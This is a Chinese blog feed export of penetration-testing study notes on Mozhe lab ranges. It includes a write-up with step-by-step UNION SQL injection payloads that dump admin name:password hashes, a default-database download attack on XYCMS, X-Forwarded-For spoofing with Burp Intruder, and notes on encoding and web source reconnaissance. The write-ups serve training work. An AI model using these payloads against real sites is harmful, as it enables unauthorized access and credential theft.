title="4.解读代码"></a>4.解读代码</h4><p>&emsp;&emsp;看见代码是解密的流程，根据提示，我们可以一步步实现解密</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/4.jpg"></p><p>&emsp;&emsp;最后是base64加密</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/5.jpg"></p><p>&emsp;&emsp;在base64加密前是用AES的加密方式，相关参数也给出了，也就是说我们需要将</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/2.5.jpg" alt="2.5"></p><p>&emsp;&emsp;框住的字符串进行回退查看内容！</p><h4 id="5-解密操作"><a href="#5-解密操作" class="headerlink" title="5.解密操作"></a>5.解密操作</h4><p>&emsp;&emsp;先是base64解密</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/6.jpg"></p><p>&emsp;&emsp;然后是AES解密：</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/8-16591901433491.jpg"></p><p>&emsp;&emsp;我们再次阅读代码，发现他规定最后是带有_mozhe的形式，因此我们在实现sql注入时要注意这一点</p><h4 id="6-开始注入"><a href="#6-开始注入" class="headerlink" title="6.开始注入"></a>6.开始注入</h4><h6 id="①数据库查询："><a href="#①数据库查询：" class="headerlink" title="①数据库查询："></a>①数据库查询：</h6><ul><li><p>payload： -1 union select 1,database(),3,4_mozhe</p></li><li><p>url: </p><p>eGdkNThpcFRybng4VnpTQkppY3FDa2ZhOGJhWTFnQy9yYm9uL2JvZVdSdGM1eUdzNk5KUi91d1RDL1I2MWRYSQ==</p></li><li><p>得到数据库名: mozhe_Discuz_StormGroup</p></li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/9.jpg"></p><h6 id="②数据库中的表查询："><a href="#②数据库中的表查询：" class="headerlink" title="②数据库中的表查询："></a>②数据库中的表查询：</h6><ul><li>payload： -1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=“mozhe_Discuz_StormGroup”_mozhe</li><li>url: eGdkNThpcFRybng4VnpTQkppY3FDdG54VWtMbVR5VEJBa1lxMFlvdEIrMlRVbHhpYVpIeitwRlhKSkFqazd3N21XYTFoOGJ1V1ZtMUwxRm56SkJ5VVU3S0FYeGFIbDkyd0xBS1VyR2FiekxGaExqT0tWR3d4cFpWV1dqaHRSOVdqazFyV1Nnb3JPOWJNeXk3UnhEREVhckhTcFpxbTZSNSt4dFBBRmJ1QXhnZHdDZkMvT0VVdGFmK2ZlTjRSc0xq</li><li>得到表名： StormGroup_member,notice</li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/10.jpg"></p><h6 id="③字段名查询："><a href="#③字段名查询：" class="headerlink" title="③字段名查询："></a>③字段名查询：</h6><ul><li>payload： -1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=“StormGroup_member”_mozhe</li><li>url: eGdkNThpcFRybng4VnpTQkppY3FDdXZ6d1EwNGthL1B1YkJOa0tKeUpFVFV3L3phV0d6QUtiajhvTTFSUWJoV0JaYXRCVWt1WWUreiswdDhJbnpLUXg2N2xuMHJMb2hJM0NWVWtrWlZuRGs3VGVUUHgwS1Y1VDg1ZFVxdy9ZcUN0M3lITk8rTVorRlppNTZBTExqSjdMMU45bTl4alVCUzg5ZFhERVRBSVZNPQ==</li><li>得到各字段名： id,name,password,status</li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/11.jpg"></p><h6 id="④字段内容查询："><a href="#④字段内容查询：" class="headerlink" title="④字段内容查询："></a>④字段内容查询：</h6><ul><li><p>payload： -1 union select 1,group_concat(name,%3a,password),3,4 from StormGroup_member_mozhe</p></li><li><p>url:</p><p>id=eGdkNThpcFRybng4VnpTQkppY3FDcktrNkQ2cFlZbEZQUFFiOWpHYlZrVDZTcTM0MWRVQStqQWVoeUFzRkdFTWtkR0VCeCt0Y1NkMDFHeFI3MW9RSWNlTlNGOUxpMnRudHRpc3g3cGhmRkk9</p></li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/12.jpg"></p><h6 id="⑤MD5解密："><a href="#⑤MD5解密：" class="headerlink" title="⑤MD5解密："></a>⑤MD5解密：</h6><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/13.jpg"></p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/14.jpg"></p><h6 id="⑥登录成功："><a href="#⑥登录成功：" class="headerlink" title="⑥登录成功："></a>⑥登录成功：</h6><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA%EF%BC%88sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%89/15.jpg"></p><p>&emsp;&emsp;（这解密真累人！！！！！！）</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>加密编码算法</title>
    <link href="/2022/07/10/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"/>
    <url>/2022/07/10/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;在渗透测试中，一般的敏感信息都会采用加密编码的方式进行处理，所以需要我们了解到常用的一些加密方式。加密解密可以通过第三方平台、工具软件、自己代码编写等方式进行。</p><p>&emsp;&emsp;参考加解密网站：</p><ul><li><a href="https://www.sojson.com/encrypt/">https://www.sojson.com/encrypt/</a></li><li><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></li></ul><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/0.jpg"></p><h4 id="2-常见加密编码解析"><a href="#2-常见加密编码解析" class="headerlink" title="2.常见加密编码解析"></a>2.常见加密编码解析</h4><h5 id="emsp-emsp-MD5："><a href="#emsp-emsp-MD5：" class="headerlink" title="&emsp;&emsp;MD5："></a>&emsp;&emsp;MD5：</h5><p>&emsp;&emsp;（<a href="https://www.sojson.com/encrypt_md5.html%EF%BC%89">https://www.sojson.com/encrypt_md5.html）</a></p><p>&emsp;&emsp;MD5是不可逆的加密方式，分为16位和32位，加密密文字符串由A-Z,0-9随机分配，80%-90%网站管理员或用户密码加采取MD5加密。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/1.jpg"></p><p>&emsp;&emsp;值得一提的是MD5具有解密，但是解密形式的本质其实是通过枚举的办法，所以这也导致了解密的困难性（不可逆不代表不能解密）</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/2.jpg"></p><h5 id="emsp-emsp-SHA："><a href="#emsp-emsp-SHA：" class="headerlink" title="&emsp;&emsp;SHA："></a>&emsp;&emsp;SHA：</h5><p>&emsp;&emsp;（<a href="https://www.mklab.cn/utils/sha%EF%BC%89">https://www.mklab.cn/utils/sha）</a></p><p>&emsp;&emsp;SHA同样是不可逆的加密方式，由A-Z，0-9随机组合，SHA1，SHA256，SHA384，SHA512长度固定</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/3.jpg"></p><p>&emsp;&emsp;不同的编码格式，所对应的加密长度是不相同的</p><h5 id="emsp-emsp-ASC："><a href="#emsp-emsp-ASC：" class="headerlink" title="&emsp;&emsp;ASC："></a>&emsp;&emsp;ASC：</h5><p>&emsp;&emsp;（<a href="https://www.matools.com/code-convert-ascii%EF%BC%89">https://www.matools.com/code-convert-ascii）</a></p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/4.jpg"></p><h5 id="emsp-emsp-进制"><a href="#emsp-emsp-进制" class="headerlink" title="&emsp;&emsp;进制:"></a>&emsp;&emsp;进制:</h5><p>&emsp;&emsp;(<a href="https://www.sojson.com/hexconvert.html">https://www.sojson.com/hexconvert.html</a>)</p><p>&emsp;&emsp;数学上的进制转换，基本不会使用（毕竟用的太low了）</p><h5 id="emsp-emsp-时间戳："><a href="#emsp-emsp-时间戳：" class="headerlink" title="&emsp;&emsp;时间戳："></a>&emsp;&emsp;时间戳：</h5><p>&emsp;&emsp;（<a href="https://shijianchuo.net/%EF%BC%89">https://shijianchuo.net/）</a></p><p>&emsp;&emsp;网站或者服务器经常会使用到的加密方式，以及数据库里用户登录和注销等。采用的不是常规的时间格式，而是特定的数字串。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/5.jpg"></p><h5 id="emsp-emsp-URL："><a href="#emsp-emsp-URL：" class="headerlink" title="&emsp;&emsp;URL："></a>&emsp;&emsp;URL：</h5><p>&emsp;&emsp;（<a href="https://www.sojson.com/encodeurl.html%EF%BC%89">https://www.sojson.com/encodeurl.html）</a></p><p>&emsp;&emsp;url编码加密就是将播放地址自定义算法编码，创建私有协议的播放地址。 播放需要专用的播放器进行地址解码。 浏览器只做一次加密，在渗透绕过的时候可能会使用二次，三次加密方式。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/6.jpg"></p><h5 id="emsp-emsp-BASE64："><a href="#emsp-emsp-BASE64：" class="headerlink" title="&emsp;&emsp;BASE64："></a>&emsp;&emsp;BASE64：</h5><p>&emsp;&emsp;（<a href="https://www.sojson.com/base64.html%EF%BC%89">https://www.sojson.com/base64.html）</a></p><p>&emsp;&emsp;Base64是一种直接利用64位可打印字符来表示二进制数据的编码算法。大小写随机组合，在字符串后面经常出现一个或两个等号；明文越长，密文越长。常见应用与代码、密码、参数。</p><p>&emsp;&emsp;加密例子：大葱蘸酱最牛逼</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/7.jpg"></p><h5 id="emsp-emsp-Unescape："><a href="#emsp-emsp-Unescape：" class="headerlink" title="&emsp;&emsp;Unescape："></a>&emsp;&emsp;Unescape：</h5><p>&emsp;&emsp;（<a href="http://web.chacuo.net/charsetescape%EF%BC%89">http://web.chacuo.net/charsetescape）</a></p><p>&emsp;&emsp;Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。 Unescape解码/解密 ，就是<strong>去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符</strong>。 如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样！</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/8.jpg"></p><h5 id="emsp-emsp-AES："><a href="#emsp-emsp-AES：" class="headerlink" title="&emsp;&emsp;AES："></a>&emsp;&emsp;AES：</h5><p>&emsp;&emsp;（<a href="https://www.mklab.cn/utils/aes%EF%BC%89">https://www.mklab.cn/utils/aes）</a></p><p>&emsp;&emsp;是相对安全的加密方式，在加密的过程中涉及到了密码、偏移量、数据块、填充四种方式的随机选择和搭配，解压的难度很大。一般用base64解密出来是乱码，有很大可能是AES加密。在比较重视安全的网站和比赛中都会使用。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/9.jpg"></p><h5 id="emsp-emsp-DES："><a href="#emsp-emsp-DES：" class="headerlink" title="&emsp;&emsp;DES："></a>&emsp;&emsp;DES：</h5><p>&emsp;&emsp;（<a href="https://www.sojson.com/encrypt_des.html%EF%BC%89">https://www.sojson.com/encrypt_des.html）</a></p><p>&emsp;&emsp;DES是目前最为流行的加密算法之一。DES是对称的，也就是说它使用同一个密钥来加密和解密数据。 DES还是一种分组加密算法，该算法每次处理固定长度的数据段，称之为分组。DES分组的大小是64位，如果加密的数据长度不是64位的倍数，可以按照某种具体的规则来填充位。</p><p><img src="/img/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/10.jpg"></p><h4 id="3-加密形式算法解析"><a href="#3-加密形式算法解析" class="headerlink" title="3.加密形式算法解析"></a>3.加密形式算法解析</h4><ul><li>直接加密</li><li>salt</li><li>密码</li><li>偏移</li><li>带位数</li><li>带模式</li><li>带干扰</li><li>自定义组合</li><li>等</li></ul><h4 id="4-解密方法"><a href="#4-解密方法" class="headerlink" title="4.解密方法"></a>4.解密方法</h4><ul><li>枚举</li><li>自定义逆向算法</li><li>可逆向</li></ul><h4 id="5-常规加密算法的特性"><a href="#5-常规加密算法的特性" class="headerlink" title="5.常规加密算法的特性"></a>5.常规加密算法的特性</h4><ul><li>长度位数</li><li>字符规律</li><li>代码分析</li><li>搜索获取</li><li>等</li></ul><h4 id="6-其他相关涉及资源"><a href="#6-其他相关涉及资源" class="headerlink" title="6.其他相关涉及资源"></a>6.其他相关涉及资源</h4><p>&emsp;&emsp;<a href="https://www.mozhe.cn/">https://www.mozhe.cn</a></p><p>&emsp;&emsp;<a href="https://www.cmd5.com/">https://www.cmd5.com</a></p><p>&emsp;&emsp;<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p>&emsp;&emsp;<a href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a></p><p>&emsp;&emsp;<a href="https://www.cr173.com/soft/21692.html">https://www.cr173.com/soft/21692.html</a></p><p>&emsp;&emsp;<a href="https://gitee.com/ComsenzDiscuz/Discuzx">https://gitee.com/ComsenzDiscuz/Discuzx</a></p><h4 id="7-意义"><a href="#7-意义" class="headerlink" title="7.意义"></a>7.意义</h4><p>&emsp;&emsp;个人理解，看似加密编码算法是密码学的知识，但是我们只需要了解相关的加密方式，在实践相关的sql注入等渗透攻击时，我们输入的并不一定是直白的代码，还需要进行一定的加密运作才能。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ASP演示攻击</title>
    <link href="/2022/07/05/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/"/>
    <url>/2022/07/05/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="ASP演示攻击"><a href="#ASP演示攻击" class="headerlink" title="ASP演示攻击"></a>ASP演示攻击</h1><h4 id="1-打开靶场，选择ASP注入"><a href="#1-打开靶场，选择ASP注入" class="headerlink" title="1.打开靶场，选择ASP注入"></a>1.打开靶场，选择ASP注入</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-1.png"></p><h4 id="2-进入网站，打开任意界面，查看页面的后缀，根据后缀判断"><a href="#2-进入网站，打开任意界面，查看页面的后缀，根据后缀判断" class="headerlink" title="2.进入网站，打开任意界面，查看页面的后缀，根据后缀判断"></a>2.进入网站，打开任意界面，查看页面的后缀，根据后缀判断</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-2.png"></p><h4 id="3-查看网页底部，发现关键词XYCMS"><a href="#3-查看网页底部，发现关键词XYCMS" class="headerlink" title="3.查看网页底部，发现关键词XYCMS"></a>3.查看网页底部，发现关键词XYCMS</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-3.png"></p><h4 id="4-搜索XYCMS源码，下载"><a href="#4-搜索XYCMS源码，下载" class="headerlink" title="4.搜索XYCMS源码，下载"></a>4.搜索XYCMS源码，下载</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-4.png"></p><h4 id="5-打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms-mdb-asp特有文件"><a href="#5-打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms-mdb-asp特有文件" class="headerlink" title="5.打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件)"></a>5.打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件)</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-5-1.png"></p><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-5-2.png"></p><h4 id="6-该文件存有管理员的账号密码"><a href="#6-该文件存有管理员的账号密码" class="headerlink" title="6.该文件存有管理员的账号密码"></a>6.该文件存有管理员的账号密码</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-6.png"></p><h4 id="7-根据下载的源码路径，可以去尝试访问网站的目录：-http-192-168-139-137-8003-xydata-xycms-mdb-下载到文件"><a href="#7-根据下载的源码路径，可以去尝试访问网站的目录：-http-192-168-139-137-8003-xydata-xycms-mdb-下载到文件" class="headerlink" title="7.根据下载的源码路径，可以去尝试访问网站的目录： http://192.168.139.137:8003/xydata/xycms.mdb,下载到文件"></a>7.根据下载的源码路径，可以去尝试访问网站的目录： <a href="http://192.168.139.137:8003/xydata/xycms.mdb,%E4%B8%8B%E8%BD%BD%E5%88%B0%E6%96%87%E4%BB%B6">http://192.168.139.137:8003/xydata/xycms.mdb,下载到文件</a></h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-7.png"></p><h4 id="8-尝试访问到后台"><a href="#8-尝试访问到后台" class="headerlink" title="8.尝试访问到后台"></a>8.尝试访问到后台</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-8.png"></p><h4 id="9-数据库中admin数据-密码MD5解密"><a href="#9-数据库中admin数据-密码MD5解密" class="headerlink" title="9.数据库中admin数据 密码MD5解密"></a>9.数据库中admin数据 密码MD5解密</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-9.png"></p><h4 id="10-使用用户密码即可登录"><a href="#10-使用用户密码即可登录" class="headerlink" title="10.使用用户密码即可登录"></a>10.使用用户密码即可登录</h4><p><img src="/img/ASP%E6%BC%94%E7%A4%BA%E6%94%BB%E5%87%BB/4-10.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>web源码扩展</title>
    <link href="/2022/07/04/web%E6%BA%90%E7%A0%81%E6%89%A9%E5%B1%95/"/>
    <url>/2022/07/04/web%E6%BA%90%E7%A0%81%E6%89%A9%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB源码"><a href="#WEB源码" class="headerlink" title="WEB源码"></a>WEB源码</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>&emsp;&emsp;Web源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中Web源码有很多技术需要简明分析。比如：获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</p><p><img src="/img/web%E6%BA%90%E7%A0%81%E6%89%A9%E5%B1%95/3-1.png"></p><h3 id="二、web源码目录结构"><a href="#二、web源码目录结构" class="headerlink" title="二、web源码目录结构"></a>二、web源码目录结构</h3><ul><li><p>据库配置文件</p></li><li><p>后台目录</p></li><li><p>模板目录</p></li><li><p>数据库目录</p></li><li><p>index.php 根据文件后缀判定</p></li><li><p>admin 网站后台路径</p></li><li><p>data 数据相关目录</p></li><li><p>install 安装目录</p></li><li><p>member 会员目录</p></li><li><p>template 模板目录(和网站相关的整体架构)</p></li><li><p>data =&gt; confing.php 数据库配置文件，网站和数据库的通讯信息，连接账号密码，可以去连接对方数据库，从数据库去得到这个网站的源码里面涉及到的管理员的账号密码。</p></li></ul><h3 id="三、web源码脚本类型"><a href="#三、web源码脚本类型" class="headerlink" title="三、web源码脚本类型"></a>三、web源码脚本类型</h3><ul><li>ASP</li><li>PHP</li><li>ASPX</li><li>JSP</li><li>JAVAWEB</li><li>其他</li></ul><h3 id="四、web源码应用分类"><a href="#四、web源码应用分类" class="headerlink" title="四、web源码应用分类"></a>四、web源码应用分类</h3><p>&emsp;&emsp;对于社交、论坛、门户、第三份以及博客等Web的应用而言，不同的应用意味着不同的代码机制对应漏洞。在审计Web源码模板时，应该需要注意开源未开源、框架非框架以及关于CMS识别问题及后续等。</p><p>网站类侧重漏洞：</p><ul><li>门户网站———————-综合类漏洞</li><li>电商—————————业务逻辑漏洞</li><li>论坛—————————XSS漏洞</li><li>博客—————————漏洞较少</li><li>第三方————————根据博客功能决定</li></ul><h3 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h3><p>&emsp;1）框架与非框架</p><p>&emsp;&emsp;当被攻击方采用的是框架类型的Web源码时，我们就可以直接寻找整体框架的漏洞，如果是非框架的Web源码，则寻到的漏洞是针对代码写出来的漏洞（即代码审计）</p><p>&emsp;&emsp;  比如：thinkPHP漏洞</p><p>&emsp;2）CMS（内容管理系统）</p><ul><li><p>CMS：</p><p>内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场</p></li><li><p>CMS识别：</p><p>判定一个网站是用什么程序搭建的</p></li><li><p>CMS组成要素</p><p>–文档模板</p><p>–脚本语言或标记语言</p><p>–与数据库集成</p></li><li><p>CMS识别</p><p>–<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p>–<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p></li></ul><p>&emsp;3）源码的获取途径</p><ul><li>扫描工具探测备份文件</li><li>CMS识别技术获取CMS名称然后从网上下载</li><li>百度直接搜索：源码</li><li>咸鱼上会有卖</li><li>第三方源码站：比如菜鸟源码</li><li>各种行业对应</li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>抓包攻击演示</title>
    <link href="/2022/07/02/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/"/>
    <url>/2022/07/02/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="抓包攻击演示（Burp）"><a href="#抓包攻击演示（Burp）" class="headerlink" title="抓包攻击演示（Burp）"></a>抓包攻击演示（Burp）</h1><h2 id="1-进入投票系统，每个ip只能点击一次"><a href="#1-进入投票系统，每个ip只能点击一次" class="headerlink" title="1.进入投票系统，每个ip只能点击一次"></a>1.进入投票系统，每个ip只能点击一次</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-1.png"></p><h2 id="2-使用burp进行抓包，增加X-FORWARDED-FOR"><a href="#2-使用burp进行抓包，增加X-FORWARDED-FOR" class="headerlink" title="2.使用burp进行抓包，增加X_FORWARDED_FOR"></a>2.使用burp进行抓包，增加X_FORWARDED_FOR</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-2.png"></p><h2 id="3-发送到intruder，设置变量"><a href="#3-发送到intruder，设置变量" class="headerlink" title="3.发送到intruder，设置变量"></a>3.发送到intruder，设置变量</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-3.png"></p><h2 id="4-设置数值"><a href="#4-设置数值" class="headerlink" title="4.设置数值"></a>4.设置数值</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-4.png"></p><h2 id="5-开始攻击"><a href="#5-开始攻击" class="headerlink" title="5.开始攻击"></a>5.开始攻击</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-5.png"></p><h2 id="6-完成任务"><a href="#6-完成任务" class="headerlink" title="6.完成任务"></a>6.完成任务</h2><p><img src="/img/%E6%8A%93%E5%8C%85%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/3-6.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>http和https</title>
    <link href="/2022/07/02/http%E5%92%8Chttps/"/>
    <url>/2022/07/02/http%E5%92%8Chttps/</url>
    
    <content type="html"><![CDATA[<h2 id="1-HTTP-S数据包种类"><a href="#1-HTTP-S数据包种类" class="headerlink" title="1.HTTP/S数据包种类"></a>1.HTTP/S数据包种类</h2><ul><li>1）Request 请求数据包</li><li>2）Proxy 代理服务器</li><li>3）Response 返回数据包</li></ul><h2 id="2-协议结构"><a href="#2-协议结构" class="headerlink" title="2.协议结构"></a>2.协议结构</h2><p><img src="/img/http%E5%92%8Chttps/2-1.png"></p><ul><li>–HTTPS协议需要得到CA申请证书。</li><li>–HTTP是超文本传输协议，信息是明文传输，HTTPS则是具有安全性的SSL加密传输协议。</li><li>–HTTP和HTTPS使用的是完全不同的连接方式，用的端口也不一样，HTTP使用80端口，HTTPS使用443。</li><li>–HTTP的连接比较简单，是无状态的；HTTPS协议是由SSL+HTTP协议与构成的，可进行加密传输，身份认证的网络协议，比HTTP协议更加安全。</li></ul><h2 id="3-通信过程"><a href="#3-通信过程" class="headerlink" title="3.通信过程"></a>3.通信过程</h2><ul><li><p>1）HTTP通信过程</p><p>建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</p><p>–浏览器建立与web服务器直接的连接。</p><p>–浏览器将请求数据打包（生成请求数据包）并发送到web服务器。</p><p>–web服务器将处理结果打包（生成响应数据包）并发送到浏览器。</p><p>–web服务器关闭连接。</p></li><li><p>2）HTTPS通信过程</p></li></ul><p><img src="/img/http%E5%92%8Chttps/2-2.png"></p><h2 id="4-Request请求数据包数据格式"><a href="#4-Request请求数据包数据格式" class="headerlink" title="4.Request请求数据包数据格式"></a>4.Request请求数据包数据格式</h2><ul><li><p>1）请求行</p><p>–包括请求类型/请求资源路径、协议的版本和类型，一般而言，请求行由三个标记组成：请求方法、请求URL和HTTP版本，它们用空格分隔。</p><p>–例如： GET /index.html HTTP/1.1</p><p>HTTP规划定义了8中可能的请求方法：</p><p>① GET：检索URL中标识资源的一个简单请求。</p><p>② HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档。</p><p>③ POST：服务器接收被写入客户端输出流中数据的请求。</p><p>④ PUT：服务器保存请求数据作为指定URL新内容的请求</p><p>⑤ DELETE：服务器删除URL中命令的资源的请求</p><p>⑥ OPTIONS：关于服务器支持的请求方法信息的请求</p><p>⑦ TRACE：web服务器反馈HTTP请求和其头标的请求</p><p>⑧ CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理</p></li><li><p>2）请求头</p><p>–一些键值对，浏览器与web服务器之间都可以发送，包含了特殊的某种含义。</p><p>① HOST：主机或域名地址。</p><p>② Accept：指浏览器或其他客户可以接受的MIME文件格式，servlet可以根据它判断并返回适当的文件格式。</p><p>③ User-Agent：是客户浏览器名称。</p><p>④ Host：对应网址URL中的web名称和端口号。</p><p>⑤ Accept-Language：指出浏览器可以接受的语言种类，如en或者en-us，指英语。</p><p>⑥ connection：用来告诉服务器是否可以维持固定的HTTP连接、http是无连接的，HTTP/1.1使用Keep-Alive为默认值，这样当浏览器需要多个文件时（比如一个HTML文件和相关的图形文件），不需要每次都建立连接。</p><p>⑦ 